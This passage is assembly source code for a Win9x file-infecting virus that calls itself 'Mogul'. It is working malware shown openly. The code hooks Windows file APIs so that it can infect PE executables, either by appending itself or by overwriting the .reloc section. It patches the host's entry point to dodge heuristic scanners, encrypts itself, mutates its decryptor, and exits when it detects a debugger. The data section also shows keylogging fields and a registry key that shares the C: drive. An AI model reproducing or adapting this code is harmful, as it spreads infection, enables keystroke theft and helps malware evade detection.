               mov esi, [ebp+DeleteFileA]
               call    init_from_proc
               ret

   ;................................................................................................

   vpFindFirstFileA:   call    get_ebp
               pop esi         ; esi = return address
               mov edi,[esp]       ; edi = filename (input)
               call    [ebp+FindFirstFileA]    ; process API
               cmp eax,0
               je  no_file_found
               mov [ebp+FFFhandle],eax
               push    780 ; bytes to allocate
               push    40h ;GMEM_ZEROINIT
               call    [ebp+GlobalAlloc]
               mov [ebp+FFFmemory],eax
               push    edi
               push    eax
               call    [ebp+lstrcpyA]
               mov ebx,[ebp+FFFmemory]
   FFFstrLoop:     inc ebx
               cmp byte ptr [ebx],0
               jnz FFFstrLoop
   PathLoop:       dec ebx
               cmp byte ptr [ebx],'\'
               jnz PathLoop
               inc ebx         ; cut name after '\': store path
               mov byte ptr [ebx],0
               call    FindFileHandler
               push    esi
               push    dword ptr [ebp+FFFhandle]
               jmp @setebp
   no_file_found:      push    esi
               call    set_ebp
               xor eax,eax
               ret
   vpFindNextFileA:    call    get_ebp
               pop esi
               mov edi,[esp+4]
               call    [ebp+FindNextFileA]
               cmp eax,0
               je  no_next_file
               call    FindFileHandler
               push    esi
               push    dword ptr [ebp+FFFhandle]
               jmp @setebp
   no_next_file:       push    esi
               call    set_ebp
               xor eax,eax
               ret
   vpFindClose:        call    get_ebp
               pop esi
               push    dword ptr [ebp+FFFmemory]
               call    [ebp+GlobalFree]
               call    [ebp+FindClose]
               push    esi
               push    eax
   @setebp:        call    set_ebp
               pop eax
               ret
   FindFileHandler:    mov ebx,[ebp+FFFmemory]
               push    ebx
               add ebx,260
               push    ebx
               call    [ebp+lstrcpyA]
   getendloop:     inc ebx
               cmp byte ptr [ebx],0
               jnz getendloop
               mov eax,edi
               add eax,szFileName
               push    eax
               push    ebx
               call    [ebp+lstrcpyA]
               mov edi,[ebp+FFFmemory]
               add edi,260     ; edi = filename
               lea ebx,[ebp+WFD]
               push    ebx
               push    edi
               call    [ebp+FindFirstFileA]
               push    eax             ; findfile handle
               call    [ebp+FindClose]             ; close it
               call    infect_this_file
               ret

   ;................................................................................................

   ;********************************
   ;* initialize from the API  *
   ;* handler: check and process   *
   ;* EXE              *
   ;********************************


   init_from_proc: pop dword ptr [ebp+ProcRet]
           pop dword ptr [ebp+HostRet]
           call    LoadAntiDebugger
           mov [ebp+ActiveAPI],esi
           lea ebx,[ebp+WFD]
           push    ebx
           push    dword ptr [esp+4]       ; filename
           call    [ebp+FindFirstFileA]
           mov edi,eax             ; findfile handle
           push    edi             ; findfile handle
           call    [ebp+FindClose]             ; close it

           mov edi,[esp]
           call    infect_this_file

           call    [ebp+ActiveAPI]

           call    UnloadAntiDebugger

           push    dword ptr [ebp+HostRet]
           push    dword ptr [ebp+ProcRet]
   set_ebp:    call    restoreregs
           ret
   get_ebp:    call    get_proc_delta      ; returns delta pointer in edx
   get_proc_delta: pop eax
           sub eax,(offset start + (get_proc_delta - start))
           mov [eax+_EDI],edi  ; store registers on entry (exept eax, wich is the
           mov [eax+_EBP],ebp  ; return value)
           mov [eax+_ESI],esi
           mov [eax+_EDX],edx
           mov [eax+_ECX],ecx
           mov [eax+_EBX],ebx
           mov ebp,eax
           ret


   ;********************************
   ;* MemoryMapping function   *
   ;*              *
   ;********************************

   MemoryMapEdit:
           push    edi
                   push    0
                   push    FILE_ATTRIBUTE_NORMAL
                   push    OPEN_EXISTING
                   push    0
                   push    FILE_SHARE_READ
                   push    GENERIC_READ + GENERIC_WRITE
                   push    esi                     ;pszFileName
           call    [ebp+CreateFileA]       ; Open the file
           push    eax
           mov [ebp+hFile],eax
                   push    0
                   push    [ebp+MapSize]
                   push    0
                   push    PAGE_READWRITE
                   push    0
                   push    eax
           call    [ebp+CreateFileMappingA]
           push    eax
                   push    [ebp+MapSize]
                   push    0
                   push    0
           push    FILE_MAP_READ + FILE_MAP_WRITE
                   push    eax
           call    [ebp+MapViewOfFile]
           push    eax
           call    dword ptr [esp+12]
           call    [ebp+UnmapViewOfFile]
           call    [ebp+CloseHandle]
           lea ecx,[ebp+WFD.ftLastWriteTime]
           push    ecx
           lea ecx,[ebp+WFD.ftLastAccessTime]
           push    ecx
           lea ecx,[ebp+WFD.ftCreationTime]
           push    ecx
           push    dword ptr [ebp+hFile]
           call    [ebp+SetFileTime]
           call    [ebp+CloseHandle]       ; Close the file
           pop edi
           ret




   ;********************************
   ;* check if file can be     *
   ;* infected, prepare it for *
   ;* virus code           *
   ;********************************


   checkfile:  mov esi,eax
           cmp [ebp+MapSize],16384 ; do not infect files below 16Kb
           jb  checkfile_ExitErr
           cmp [ebp+MapSize],16777216  ; do not infect files above 16Mb
           ja  checkfile_ExitErr
           cmp word ptr [esi],'ZM' ; Executable?
           jnz checkfile_ExitErr
           cmp dword ptr [esi+3Ch],0   ; No NewExe header?
           jz  checkfile_ExitErr
           mov eax,[ebp+MapSize]
           cmp dword ptr [esi+3Ch],eax ; is pointer CORRUPTED (1 of 813 on my test-PC was..)????
           jnb checkfile_ExitErr
           mov ebx,[esi+3Ch]
           add ebx,esi
           cmp word ptr [ebx],'EP' ; PE?
           jnz checkfile_ExitErr
           cmp byte ptr [ebx-1],01h    ; already infected?
           jz  checkfile_ExitErr
           movzx   eax,word ptr [ebx+22]
           or  eax,2000h       ; library image (DLL)?
           jz  checkfile_ExitErr
           mov byte ptr [ebx-1],01h    ; mark file infected
           mov dword ptr [ebx+88],0    ; Null checksum (linker default)
           mov [ebp+filebase],esi

           push    esi
           mov     cx,word ptr [ebx+06h]   ; nr. of objects
           movzx   edi,word ptr [ebx+20]   ; Word, NT header size
           add edi,24          ; add size of image file header
           add edi,ebx         ; edi points to first section header
           mov esi,[edi.PhysicalOffset]
           dec cx
   OffsLoop:   add edi,40
           cmp esi,[edi.PhysicalOffset]    ; is last POffset below this one
           jae not_last            ; in that case, the last is closer
           mov esi,[edi.PhysicalOffset]    ;
           mov edx,edi             ; set pointer (edx)
   not_last:   dec cx
           cmp cx,0
           jnz OffsLoop
           mov edi,edx
           pop esi

           mov eax,[ebx+40]
           mov [ebp+OldEntryPointRVA],eax
           or  dword ptr [edi.Flags],IMAGE_SCN_MEM_READ Or IMAGE_SCN_MEM_WRITE Or IMAGE_SCN_CNT_INITIALIZED_DATA
           mov ecx,dword ptr [ebx+60]

           cmp dword ptr [edi+1],'oler'    ; reloc ?
           jnz ordinary_infect
           cmp dword ptr [edi.VirtualSize],program_total_size
           jb  reloc_expand
           cmp dword ptr [edi.PhysicalSize],program_total_size
           ja  reloc_infect
           mov dword ptr [edi.PhysicalSize],program_total_size

   ;********************************
   ;* infect by overwriting .reloc *
   ;* data             *
   ;********************************

   reloc_infect:   xor eax,eax
           mov [ebx+160],eax       ; blank "fixup table RVA" in PE header
           mov [ebx+164],eax       ; blank "total fixup data size" in PE header
           mov edx,[edi.RVA]
           mov [ebp+VirusEntryPointRVA],edx
           mov eax,[edi.PhysicalOffset]
           mov [ebp+OffsetInFile],eax
           mov eax,[ebp+MapSize]
           mov [ebp+NewFileSize],eax
           call    patch_codesection
           ret

   ;********************************
   ;* infect by appending virus to *
   ;* end of file          *
   ;********************************

   ordinary_infect:
           mov eax,dword ptr [ebx+80]  ; eax=old image size
           add eax,program_total_size  ; add it to the size of our virus
           call    AlignFix        ; align it to the file alignement
           mov [ebx+80],eax        ; Set new ImageSize.
           mov eax,[edi.PhysicalSize]  ; eax=Physical size of object
           push    eax eax         ; save it on stack
           add eax,program_total_size  ; add the size of our cute virus
           mov [edi.PhysicalSize],eax  ; write it back
           call    AlignFix        ; align it to the file alignement
           mov [edi.VirtualSize],eax   ; put it in the VirtualSize field
           pop edx         ; edx=the old physical size..
           add edx,[edi.RVA]       ; add the sections RVA and we got
           mov [ebp+VirusEntryPointRVA],edx    ; store it
           pop eax         ; eax=the sections old physical size..
           add eax,[edi.PhysicalOffset]        ; add it to physical offset of section
           mov [ebp+OffsetInFile],eax  ; =virus offset in file
           add eax,program_total_size  ; add it to the size of our virus
           call    AlignFix        ; align it to the file alignement
           mov [ebp+NewFileSize],eax   ; and we got the new filesize
           call    patch_codesection
           ret

   checkfile_ExitErr:
           mov byte ptr [ebp+FileState], 1
           ret


   ;********************************
   ;* infect by overwriting .reloc *
   ;* data as well as expanding    *
   ;* .reloc section to virus size *
   ;********************************

   reloc_expand:   xor eax,eax
           mov [ebx+160],eax       ; blank "fixup table RVA" in PE header
           mov [ebx+164],eax       ; blank "total fixup data size" in PE header
           mov edx,[edi.RVA]           ; BUGFIX <- fix file and object alignement here to
           mov [ebp+VirusEntryPointRVA],edx    ; save filesize on 2Kb reloc's
           mov eax,[edi.PhysicalOffset]
           mov [ebp+OffsetInFile],eax
           mov eax,[edi.VirtualSize]
           push    eax
           sub [ebx+80],eax        ; image size - last section
           mov eax,program_total_size  ; size of our virus
           mov [edi.PhysicalSize],eax
           call    AlignFix        ; align it to the file alignement
           mov [edi.VirtualSize],eax   ; set new virtualsize for .reloc
           add [ebx+80],eax        ; set new image size
           pop edx
           sub eax,edx
           add eax,[ebp+MapSize]
           mov [ebp+NewFileSize],eax
           call    patch_codesection
           ret

   ;********************************
   ;* ANTIHEURISTIC FEATURE    *
   ;* Attempts to patch hosts CODE *
   ;* section with a 17-byte virus *
   ;* loader           *
   ;********************************


   patch_codesection:
           movzx   edi,word ptr [ebx+20]   ; Word, NT header size
           add edi,24          ; add size of image file header
           add edi,ebx         ; edi points to first section header
   section_loop:
           mov eax,[edi.RVA]
           cmp [ebp+OldEntryPointRVA],eax
           jb  not_code
           add eax,[edi.PhysicalSize]
           cmp [ebp+OldEntryPointRVA],eax
           jb  got_code
   not_code:   add edi,40
           cmp [edi.Flags],0
           jnz section_loop
           jmp exit_without_antiheurism
   got_code:
           pushad
           mov eax,[edi.PhysicalOffset]    ; we got the section that the EntryPoint RVA
           mov edx,[edi.PhysicalSize]      ; points to
           add edx,17              ; Attempt to expand Physical size of object with 5 bytes
           cmp edx,[edi.VirtualSize]       ; no need to change alignement?
           ja  overwrite_code
           add eax,[edi.PhysicalSize]
           add eax,[ebp+filebase]
           mov ecx,[edi.RVA]
           add ecx,[edi.PhysicalSize]
           mov [ebx+40],ecx            ; set EntryPointRVA to jumper
           add dword ptr [edi.PhysicalSize],17 ; set new physicalsize (+17 bytes)
           call    @patch_eax
           mov edx,[ebp+VirusEntryPointRVA]    ;   virus RVA
           sub edx,ecx             ; - Entrypoint RVA
           mov [eax+12],edx            ; = Jump length
           popad
           ret
   overwrite_code: popad
           mov ecx,[ebx+40]            ; ecx = EP RVA
           sub ecx,[edi.RVA]           ; ecx = physical offset in section
           mov ecx,[edi.PhysicalOffset]    ; ecx = physical offset in file
           add ecx,[ebp+filebase]      ; ecx = VA to EP in mapped memory.
           lea ebx,[ebp+OriginalHostData]
           xor edx,edx
   store_dta_loop: mov al,byte ptr [ecx+edx]       ; save original host data
           mov byte ptr [ebx+edx],al
           inc edx
           cmp edx,17
           jbe store_dta_loop
           xchg    eax,ecx
           call    @patch_eax
           mov edx,[ebp+VirusEntryPointRVA]    ;   virus RVA
           sub edx,[ebp+OldEntryPointRVA]  ; - RVA of jumper
           SUB EDX,5               ; - length of 'jump virus' instruction
           mov [eax+12],edx            ; = Jump length
           ret
   exit_without_antiheurism:
           popad   ; virus is appended to file, but will never take control because of an
           ret ; error. could just set the IMAGE_SCN_MEM_EXECUTE bit for last section,
               ; and updated EntryPointRVA to virus, but it would be too easy to detect
               ; by heuristic scanners


   ;********************************
   ;* Generate the virus loader    *
   ;* located in CODE section at   *
   ;* the EntryPoint RVA       *
   ;********************************

   ;start:     call    get_delta
   ;get_delta: sub [esp],(get_delta - start)
   ;       add [esp],12345678h
   ;       ret
   @patch_eax: mov dword ptr [eax],0E8h        ; E8 00 00 00
           mov dword ptr [eax+4],242C8300h ; 00 83 2C 24
           mov dword ptr [eax+8],24048105h ; 05 81 04 24
           mov byte ptr [eax+16],0C3h      ; ret
           ret
   AlignFix    proc
           push    edx         ; store edx
           xor edx, edx
           div ecx                          ;/alignment
           inc eax                          ;next alignment
           mul ecx                          ;*alignment
           pop edx         ; restore edx
           ret
   AlignFix    endp



   ;********************************
   ;* dump virus code to file  *
   ;*              *
   ;********************************

   dump_virus_code:

           call    patch_decryptor

           push    eax
           mov ebx,[eax+3Ch]
           mov eax,[eax+ebx+8]
           mov dword ptr [ebp+decryptor],eax
           mov dword ptr [ebp+encryptor],eax
           pop eax

           mov edx,[ebp+NewFileSize]       ; no need for comments here.. just straight
           sub edx,[ebp+OffsetInFile]      ; ahead loops.
           add eax,[ebp+OffsetInFile]
           mov esi,eax
           lea ebx,[ebp+start]
           xor ecx,ecx
   wrloop:     mov al,byte ptr [ebx+ecx]
           mov byte ptr [esi+ecx],al
           inc ecx
           cmp ecx,(program_compact_size + 1)
           jb  wrloop
   null_loop:  mov byte ptr [esi+ecx],0
           inc ecx
           cmp ecx,edx
           jb  null_loop


           pushad

           add esi,decryptorsize   ; esi points to start of encrypted data
           mov edi,esi
           add edi,(end_encrypted - encrypted) ; edi points to end of encrypted data

   encrypt_loop:   sub [esi],12345678h
   encryptor   equ $ - 4
           add esi,4
           cmp esi,edi
           jb  encrypt_loop

           popad

           ret


   ;********************************
   ;* patch decryptor to change    *
   ;* registers (metamorphism) *
   ;********************************

   patch_decryptor:

       pushad
       xor al,al
       cmp byte ptr [ebp+files_per_directory],2
       jbe combination1
       cmp byte ptr [ebp+files_per_directory],3
       jbe combination2
       cmp byte ptr [ebp+files_per_directory],4
       jbe combination3

   combination4:   mov al,5
           jmp combination1
   combination3:   mov al,4
           jmp combination1
   combination2:   mov al,2
   combination1:

       lea ebx,[ebp+start]
       mov byte ptr [ebx+06h],059h     ; set decryptor delta to ecx
       mov byte ptr [ebx+08h],0E9h
       mov byte ptr [ebx+0Eh],091h
       mov byte ptr [ebx+14h],0B9h
       add byte ptr [ebx+06h],al
       add byte ptr [ebx+08h],al
       add byte ptr [ebx+0Eh],al
       add byte ptr [ebx+14h],al

       popad
       ret



   ;********************************
   ;* Encrypt the string table *
   ;*              *
   ;********************************

   encrypt_stringz:
           pushad
           lea esi,[ebp+misc_stringz]
           cmp byte ptr [esi],'['      ; '[' ?
           jnz end_enc             ; not '[', so asume we're already encrypted.
           lea edi,[ebp+end_api_stringz]
   enc_loop:   sub dword ptr [esi],12345678h
           add esi,4
           cmp esi,edi
           jb  enc_loop
   end_enc:    popad
           ret

   ;********************************
   ;* Decrypt string table     *
   ;*              *
   ;********************************

   decrypt_stringz:
           pushad
           lea esi,[ebp+misc_stringz]
           cmp byte ptr [esi],'['      ; '[' ?
           jz  end_dec             ; a '['! then it's no need to decrypt.
           lea edi,[ebp+end_api_stringz]
   dec_loop:   add dword ptr [esi],12345678h
           add esi,4
           cmp esi,edi
           jb  dec_loop
   end_dec:    popad
           ret

   ;********************************
   ;* Start on error: return   *
   ;* control.         *
   ;********************************

   error_start:    call    setup_host
           push    dword ptr [ebp+OldEntrypointVA]
           call    restoreregs
           ret
   setup_host:

   ;********************************
   ;* Get base address of the  *
   ;* host file            *
   ;********************************

           lea esi,[ebp+start]
           sub esi,[ebp+VirusEntryPointRVA]    ; got base

   ;********************************
   ;* Get return address       *
   ;* to host          *
   ;********************************

           mov eax,[ebp+OldEntryPointRVA]
           add eax,esi
           mov [ebp+OldEntrypointVA],eax   ; got return pointer to host code
       ret


   CreateNewThread:
           lea eax,[ebp+lpThreadId]
           push    eax
           push    0       ; start thread immidiatly
           push    0       ; lpParameter
           push    eBx
           push    0       ; stack size (default)
           push    0       ; security attributes
           call    [ebp+CreateThread]
           RET

   LoadAntiDebugger:
           pushad
           mov byte ptr [ebp+isActive],1
           lea ebx,[ebp+AntidebuggerThread]
           call    CreateNewThread
           popad
           ret
   UnloadAntiDebugger:
           mov byte ptr [ebp+isActive],0
           ret
   AntidebuggerThread:
           call    Get_Delta
   debugloop:  cmp byte ptr [ebp+isActive],0
           jz  exit_thread
   WinNT:      mov eax,[ebp+IsDebuggerPresent]
           or  eax,eax
           jz  Win95
           call    eax
           or  eax,eax
           jnz caught
   Win95:      mov ecx,fs:[20h]
           jecxz   debugloop
   caught:     push    0
           call    [ebp+ExitProcess]   ; debugger caught, exit process!
   exit_thread:    push    0
           call    [ebp+ExitThread]    ; exit scan

   ;********************************
   ;* Text/API stringz     *
   ;*              *
   ;********************************

   IsLoggingDevice     dd  0

   misc_stringz:       db  '['
   szTitle         db  'Win9x/Mogul.'
               db      program_total_size/1000 mod 10 +"0"
               db      program_total_size/100 mod 10 +"0"
               db      program_total_size/10 mod 10 +"0"
               db      program_total_size/1 mod 10 +"0"
               db  " by Vital/IkX]", 13, 0
   szLogDir        db  'C:\bckup', 0
   szLogFile       db  'C:\bckup\'
   szHr            db  'hhmm_'
   szDmy           db  'ddmm.log', 0
   szNotepad       db  '\mogul.dat', 0
   szExplorer      db  '\Explorer.exe', 0
   szUser32        db  'USER32.dll', 0
   szGetAsyncKeyState  db  'GetAsyncKeyState', 0
   szLoadCursorA       db  'LoadCursorA', 0
   szSetSystemCursor   db  'SetSystemCursor', 0
   szAdvapi32      db  'ADVAPI32.dll', 0
   szRegOpenKeyA       db  'RegOpenKeyA', 0
   szRegCreateKeyA     db  'RegCreateKeyA', 0
   szRegQueryValueExA  db  'RegQueryValueExA', 0
   szRegSetValueExA    db  'RegSetValueExA', 0
   szRegCloseKey       db  'RegCloseKey', 0
   szKey           db  "Software\Microsoft\Windows\CurrentVersion", 0
   szProgFiles1        db  "ProgramFilesDir", 0
   ;szProgFiles2       db  "ProgramFilesPath", 0
   RegShareKey     db  'Software\Microsoft\Windows\CurrentVersion\Network\LanMan\ROOT$', 0
   szFlags         db  'Flags', 0
   flags           dd  00000102h
   typeflags       dd  00000000h
   szPath          db  'Path', 0
   Cdrive          db  "C:\", 0
   szParm1enc      db  'Parm1enc', 0
   szParm2enc      db  'Parm2enc'
   szNull          db  0
   szRemark        db  'Remark', 0
   szType          db  'Type', 0

   ; KERNEL32 APIs

   api_stringz:        db  'GetProcAddress', 0
               db  'GetModuleHandleA', 0
               db  'LoadLibraryA', 0
               db  'FreeLibraryA', 0
               db  'WriteProcessMemoryA', 0
               db  'GetCurrentProcess', 0
               db  'RegisterServiceProcess', 0
               db  'GetCurrentThread', 0
               db  'SetThreadPriority', 0
               db  'CloseHandle', 0
               db  'CreateFileMappingA', 0
               db  'CreateDirectoryA', 0
               db  'MapViewOfFile', 0
               db  'UnmapViewOfFile', 0
               db  'FlushViewOfFile', 0
               db  'CreateThread', 0
               db  'ExitThread', 0
               db  'ExitProcess', 0
               db  'IsDebuggerPresent', 0
               db  'Sleep', 0
               db  'GetCommandLineA', 0
               db  'SetEndOfFile', 0
               db  'SetFilePointer', 0
               db  'GetWindowsDirectoryA', 0
               db  'GetSystemDirectoryA', 0
               db  'GetCurrentDirectoryA', 0
               db  'GlobalAlloc', 0
               db  'GlobalFree', 0
               db  'lstrcpyA', 0
               db  'SetFileTime', 0
               db  'GetSystemTime', 0
               db  'GetFileAttributesA', 0
               db  'SetFileAttributesA', 0
               db  'CreateFileA', 0
               db  '_lopen', 0
               db  'MoveFileA', 0
               db  'MoveFileExA', 0
               db  'CopyFileA', 0
               db  'CopyFileExA', 0
               db  'WinExec', 0
               db  'OpenFile', 0
               db  'CreateProcessA', 0
               db  'DeleteFileA', 0
               db  'FindFirstFileA', 0
               db  'FindNextFileA', 0
               db  'FindClose', 0, 01h
   end_api_stringz:    dd  0           ; DWORDPADDING (for encription)

   ;********************************
   ;* special data fields      *
   ;*              *
   ;********************************

   secured_data:

   OldEntryPointRVA        dd  0
   VirusEntryPointRVA      dd  00001000h
   OffsetInFile            dd  0
   NewFileSize         dd  0
   OriginalHostData        db  17 dup(0)
   POLYPADDING         dd  0

   end_encrypted:

   ;********************************
   ;* data area            *
   ;*              *
   ;********************************


   data_area:
   api_address_table:  GetProcAddress      dd  0
               GetModuleHandleA    dd  0
               LoadLibraryA        dd  0
               FreeLibraryA        dd  0
               WriteProcessMemoryA dd  0
               GetCurrentProcess   dd  0
               RegisterServiceProcess  dd  0
               GetCurrentThread    dd  0
               SetThreadPriority   dd  0
               CloseHandle     dd  0
               CreateFileMappingA  dd  0
               CreateDirectoryA    dd  0
               MapViewOfFile       dd  0
               UnmapViewOfFile     dd  0
               FlushViewOfFile     dd  0
               CreateThread        dd  0
               ExitThread      dd  0
               ExitProcess     dd  0
               IsDebuggerPresent   dd  0
               Sleep           dd  0
               GetCommandLineA     dd  0
               SetEndOfFile        dd  0
               SetFilePointer      dd  0
               GetWindowsDirectoryA    dd  0
               GetSystemDirectoryA dd  0
               GetCurrentDirectoryA    dd  0
               GlobalAlloc     dd  0
               GlobalFree      dd  0
               lstrcpyA        dd  0
               SetFileTime     dd  0
               GetSystemTime       dd  0
   hooktable:      GetFileAttributesA  dd  0
               SetFileAttributesA  dd  0
               CreateFileA     dd  0
               lopen           dd  0
               MoveFileA       dd  0
               MoveFileExA     dd  0
               CopyFileA       dd  0
               CopyFileExA     dd  0
               WinExec         dd  0
               OpenFile        dd  0
               CreateProcessA      dd  0
               DeleteFileA     dd  0
               FindFirstFileA      dd  0
               FindNextFileA       dd  0
               FindClose       dd  0
                           dd  0

   jumptable:
   rdGetFileAttributesA    dd  0
   rdSetFileAttributesA    dd  0
   rdCreateFileA       dd  0
   rdlopen         dd  0
   rdMoveFileA     dd  0
   rdMoveFileExA       dd  0
   rdCopyFileA     dd  0
   rdCopyFileExA       dd  0
   rdWinExec       dd  0
   rdOpenFile      dd  0
   rdCreateProcessA    dd  0
   rdDeleteFileA       dd  0
   rdFindFirstFileA    dd  0
   rdFindNextFileA     dd  0
   rdFindClose     dd  0
               dd  0



   static_data:
   K32Base             dd  0
   K32ExpTable         dd  0
   OldEntrypointVA         dd  0
   hProcess            dd  0
   HostBaseAddr            dd  0
   ReturnAddr          dd  0
   WFD         WIN32_FIND_DATA <0>
   SystemTimeBuffer    SYSTEMTIME  <0>
   HostRet             dd  0
   ProcRet             dd  0
   ActiveAPI           dd  0
   OriginAttribs           dd  0
   MapSize             dd  0
   FileState           db  0
   FindFileHandle          dd  0
   InfectCount         db  0
   Caller              dd  0
   hFile               dd  0
   filebase            dd  0
   FFFhandle           dd  0
   FFFmemory           dd  0
   files_per_directory     db  0
   lpThreadId          dd  0
   isActive            db  0
   User32              dd  0
   Advapi32            dd  0
   advapiloaded            dd  0
   hKey                dd  0
   hKey2               dd  0
   ddRet               dd  0
   lpcbData            dd  260
   lpType              dd  1
   ddfindfile          dd  0
   ProgFilesSrcHandle      dd  0
   filemem             dd  0
   KeyLogLocalMem          dd  0
   KeyLogMemory            dd  0
   nrOfBytesWritten        dw  0
   SHIFT               dd  0
   ALTGR               dd  0
   GetAsyncKeyState        dd  0
   LastByte            db  0
   KeyLoop             db  0
   DidInfect           db  0

   registers:
   _EBP                dd  0
   _EDI                dd  0
   _ESI                dd  0
   _EDX                dd  0
   _ECX                dd  0
   _EBX                dd  0
   _EAX                dd  0

   end_program:
   ends
   end start
